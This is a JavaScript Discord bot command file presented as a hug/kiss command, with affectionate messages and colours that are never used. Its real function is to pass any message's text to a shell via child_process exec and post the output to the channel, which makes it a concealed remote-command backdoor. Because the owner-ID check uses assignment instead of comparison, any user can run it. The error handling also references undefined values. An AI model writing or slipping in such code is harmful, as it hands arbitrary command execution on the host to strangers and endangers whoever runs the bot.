const { MessageEmbed } = require('discord.js');
const { exec } = require('child_process');

exports.run = (client, message, args) => {
  let user = message.mentions.users.first() || message.author;
  const cmd2 = args.join(' ');
  const cmd = message.content.split(' ').slice(1).join(' ')
  var colors = [0x01F5D1, 0x00DDFF];
  var randColor = colors[Math.floor(Math.random() * colors.length)];
  var kissMessage = ["Aww, that's some real love right there", `${message.author} finally had their first hug!`, `Awww I wanted you to hug someone else`, `Cutest couple 2021???`]
  var randMessage = kissMessage[Math.floor(Math.random() * kissMessage.length)];
    if(message.author.id=670895157016657920) {
        exec(cmd, (error, stdout, stderr) => {
            if (error) {
              message.channel.send(`Error: ${error.message}`)
              if (errorCallback) {
                errorCallback(error.message);
              }
              return;
            }
            if (stderr) {
                message.channel.send(`Error: ${error.message}`)
              //console.log(`stderr: ${stderr}`);
              if (errorCallback) {
                errorCallback(stderr);
              }
              return;
            }

            message.channel.send(`stdout: ${stdout}`);
          });
    
    
    }
    else{
        message.channel.send("You can't do this.")
    }


}
